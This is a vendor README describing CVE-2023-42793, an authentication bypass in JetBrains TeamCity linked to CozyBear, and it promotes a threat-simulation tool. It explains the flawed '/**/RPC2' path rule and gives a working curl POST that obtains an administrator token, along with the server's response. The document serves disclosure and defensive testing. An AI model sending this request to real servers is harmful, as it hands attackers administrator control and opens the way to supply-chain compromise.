# JetBrains TeamCity CVE-2023-42793 PoC Exploit
CISA released a joint advisory on the Russian nation-state advanced persistent threat, CozyBear. CozyBear is observed to exploit an unauthenticated remote code execution vulnerability found in JetBrains TeamCity software for data exfiltration and possibly supply chain attacks.<br><br>
In this repo, Picus provides a Proof-of-Concept exploit for the CVE-2023-42793 vulnerability.

Test security controls against the CVE-2023-42793 vulnerability exploit 
--------------------------------------
Picus can help you simulate the CVE-2023-42793 vulnerability exploits for free. No setup or signup is required.<br>
Use [Picus Emerging Threat Simulator](https://insights.picussecurity.com/emerging-threat-simulator-announcement?utm_source=github&utm_medium=organic+social&utm_campaign=PLS+Offensive+-+ET+Simulator) and test your defenses in a few clicks.<br> 
If you are looking for more detailed information, check out our blog post: [CVE-2023-42793: CozyBear Targets Software Developers Exploiting JetBrains TeamCity](https://www.picussecurity.com/resource/blog/cve-2023-42793-cozybear-targets-software-developers-exploiting-jetbrains-teamcity)

CVE-2023-42793 Proof-of-concept (POC)
----------------------
CVE-2023-42793 vulnerability is an authentication bypass vulnerability. The vulnerability is found in the "RequestInterceptiors.java" file, and it is caused by the wildcard path "/**/RPC2" in the "myPreHandlingDisabled" PathSet. If any incoming HTTP request matches the wildcard path "/**/RPC2", the TeamCity server does not perform authentication checks.<br>
Adversaries abuse this vulnerability to obtain an access token by sending an HTTP POST request to "/app/rest/users/id:1/tokens/RPC2" endpoint.<br>
In the example below, RPC2 is the adversary-given name for the requested token, and it allows adversaries to gain access to an authentication token with the privileges of the user with the ID of 1, which is always the administrator created during system installation.

#### Example CVE-2023-42793 Exploit:
```bash
//Attacker-crafted POST request
curl -X POST http://<TeamCity_Server_IP>:8111/app/rest/users/id:1/tokens/RPC2

//TeamCity Server's response with Administrator authentication token
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><token name="RPC2" creationTime="2023-11-20T12:22:12.45Z" value="<Administrator_Token>"/>
```

Disclaimer
----------
Â©2024 Picus Security <br>
All rights reserved.
